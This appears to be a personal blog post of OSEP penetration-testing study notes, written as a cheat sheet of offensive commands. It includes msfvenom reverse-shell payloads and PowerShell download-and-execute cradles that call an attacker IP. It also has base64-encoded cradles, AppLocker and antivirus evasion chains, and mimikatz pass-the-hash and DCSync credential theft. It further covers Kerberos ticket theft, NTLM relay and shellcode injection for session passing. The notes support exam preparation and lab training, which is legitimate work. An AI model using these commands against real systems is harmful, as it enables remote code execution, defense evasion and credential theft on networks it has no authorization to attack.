---
layout: post
title: "OSEP Study Notes"
tags: notes
---

# OSEP Notes

msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe -o msf.exe`

`msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=443 -f exe -o msf.exe`

list encrypted options in msfvenom!

`msfvenom --list encrypt`

32bit csharp payload msfvenom

`msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.82 LPORT=443 -f csharp -o 32bit.cs`


RDP

`xfreerdp /u:<user> /d:<domain> /pth:<ntlm> /v:<ip>:3389 /dynamic-resolution`


Metasploit

`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443;exploit -j"`

Session passing from Covenant to Msf

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=8080 EXITFUNC=thread -f raw -o msf.bin`

`Inject <pid>`


DotNetToJscript

`.\DotNetToJScript.exe .\ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js`

PowerShell

`(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.82/ClassLibrary1.dll','ClassLibrary1.dll')`

`powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.82/run.txt'))`

Powershell tool Find-AVSignature

`Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force`

Covenant

```powershell
powershell -Sta -Nop -Window Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://192.168.49.82/payload.ps1')"

iex (New-Object Net.WebClient).DownloadString("http://192.168.49.82/a.ps1"); iex (New-Object Net.WebClient).DownloadString("http://192.168.49.82/payload.ps1")

iex (New-Object Net.WebClient).DownloadString("http://192.168.49.82/a.ps1"); iex (New-Object Net.WebClient).DownloadString("http://192.168.49.82/msf64.ps1")

$string = 'iex (New-Object Net.WebClient).DownloadString("http://192.168.49.82/cradle.ps1")'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($string))
```

Convert SID to hostname (Powerview or powermad)

`ConvertFrom-SID <sid-value-here>`

AppLocker Bypasses

`certutil -encode AppLockerBypass.exe file.txt`

Transfer with bitsadmin (not certutil as this gets flagged!)

`bitsadmin /Transfer myJob http://192.168.49.82/file.txt`

`certutil -decode enc.txt Bypass.exe`


Oneliner

```powershell
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode  C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe
```

# Windows

RDP lateral movement mimikatz

`sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"`

SharpRDP - We can execute any program remotely with SharpRDP.exe

`SharpRDP.exe computername=appsrv01 command=notepad username=DOMAIN\dave password=lab`

Execute out meterpreter via powershell download cradle!

```powershell
.\SharpRDP.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.82/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=DOMAIN\dave password=lab
```

Mimikatz DC SYNC

`lsadump::dcsync /domain:prod.DOMAIN.com /user:prod\krbtgt`

Rubeus

`Rubeus.exe monitor /interval:5 /filteruser:CDC01$`

Rubeus can generate NTLM hash

`.\Rubeus.exe hash /password:lab`

Create a TGT for IISVC

`.\Rubeus.exe asktgt /user:iissvc /domain:prod.DOMAIN.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E`

# Linux

ansible2john format

`python3 /usr/share/john/ansible2john.py test.yml`

Crack ansible

`hashcat test-ansible.hash --force --hash-type=16900 /usr/share/wordlists/rockyou.txt`

Search for ansible leaked passwords in syslog

`cat /var/log/syslog | grep "password"`

query DC from linux using kerberos cacche file

`smbclient -k -U "DOMAIN.COM\administrator" //DC01.DOMAIN.COM/C$`

Linux kerberos

`sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow`

`sudo chown test:test /tmp/krb5cc_minenow`

`kdestroy`

`klist`

export the variable

`export KRB5CCNAME=/tmp/krb5cc_minenow`

now check it worked!

`klist`

`kvno SQLsvc/DC01.DOMAIN.com:1433`

`scp test@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow`

export the variable as before

`export KRB5CCNAME=/tmp/krb5cc_minenow`

`ssh test@linuxvictim -D 1080`

```bash
#Impacket GetADUsers.py
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.82.5
DOMAIN.COM/Administrator

# get users SPNS
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.82.5 DOMAIN.COM/Administrator
```

'proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.DOMAIN.COM -k -no-pass'


`pwsh`

Encode the powershell cradle

```powershell
$text = 'iex (New-Object Net.WebClient).DownloadString("http://192.168.49.82/amsi.ps1"); iex (New-Object Net.WebClient).DownloadString("http://192.168.49.82/msf64.ps1")'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

Copy the base64 encoded text!

`sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.82.6 -c 'powershell -enc <base64 output from powershell cradle!'`



# Session Passing

To session pass from Metasploit to Covenant you can create a GruntHTTP.exe - create shellcode with donut
(/opt/donut)

`donut HTTPGrunt.exe -e1 -a2 -b1 -f1 -x1 -o HTTPGrunt.bin`

Then use the module “post/windows/manage/shellcode_inject”

```bash
set shellcode <.bin>
set session 
run 
```